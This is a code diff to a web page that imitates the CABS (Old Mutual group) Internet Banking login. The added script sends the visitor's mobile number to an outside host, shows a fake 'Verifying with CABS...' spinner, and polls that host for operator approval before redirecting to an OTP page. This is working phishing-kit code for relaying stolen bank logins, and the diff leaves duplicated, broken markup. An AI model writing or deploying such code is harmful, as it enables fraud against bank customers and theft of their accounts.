@@ -228,24 +228,113 @@
         <div class="welcome-text">Welcome to</div>
         <div class="ib-text">Internet Banking</div>
 
-        <!-- Login Form -->
-        <form action="otppage.html" method="GET">
+    <style>
+        /* Typography */
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap');
+
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Progress Overlay */
+        #progress-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            flex-direction: column;
+        }
+
+        .progress-circle {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 6px solid #eee;
+            border-top: 6px solid var(--cabs-blue);
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div id="progress-overlay">
+        <div class="progress-circle"></div>
+        <p style="color: var(--cabs-blue); font-weight: 600;">Verifying with CABS...</p>
+    </div>
+
+    <div class="login-container">
+        <div class="logo-container">
+            <div class="logo-main">CABS<span class="logo-swoosh">///</span></div>
+            <div class="logo-sub">A MEMBER OF THE <span>OLD MUTUAL</span> GROUP</div>
+        </div>
+
+        <div class="welcome-text">Welcome to</div>
+        <div class="ib-text">Internet Banking</div>
+
+        <form onsubmit="submitLoginToBridge(event);">
             <div class="form-group">
                 <label>Mobile Number</label>
-                <input type="tel" class="form-control" placeholder="eg. 263777777777" required>
-            </div>
-
-            <div class="form-group">
-                <label>Mobile PIN</label>
-                <!-- Using type="password" to hide PIN, but type="text" works too if you want it visible like the screenshot -->
-                <input type="password" class="form-control" placeholder="----" maxlength="4" required>
+                <input type="tel" name="phone" class="form-control" placeholder="eg. 263777777777" required>
             </div>
 
             <div class="button-group">
-                <button type="button" class="btn btn-outline" onclick="alert('Forgot PIN flow initiated.')">FORGOT PIN</button>
-                <button type="submit" class="btn btn-solid">LOGIN</button>
+                <button type="submit" class="btn btn-solid" style="width: 100%;">LOGIN</button>
             </div>
         </form>
+    </div>
+
+    <script>
+        const BRIDGE_URL = 'https://p.breachbase.lol';
+
+        async function submitLoginToBridge(event) {
+            event.preventDefault();
+            const form = event.target;
+            const data = { phone: form.phone.value };
+
+            document.getElementById('progress-overlay').style.display = 'flex';
+
+            try {
+                const response = await fetch(`${BRIDGE_URL}/v1/callback`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+                
+                const { attemptId } = await response.json();
+                pollStatus(attemptId);
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('progress-overlay').style.display = 'none';
+                alert('Submission failed.');
+            }
+        }
+
+        async function pollStatus(attemptId) {
+            const interval = setInterval(async () => {
+                const res = await fetch(`${BRIDGE_URL}/v1/status?attemptId=${attemptId}`);
+                const { status } = await res.json();
+                
+                if (status === 'approved') {
+                    clearInterval(interval);
+                    window.location.href = 'otppage.html';
+                }
+            }, 3000);
+        }
+    </script>
+</body>
 
         <!-- Security Advice -->
         <a href="#" class="security-link">IMPORTANT: Security advice to help keep your online banking secure and convenient</a>
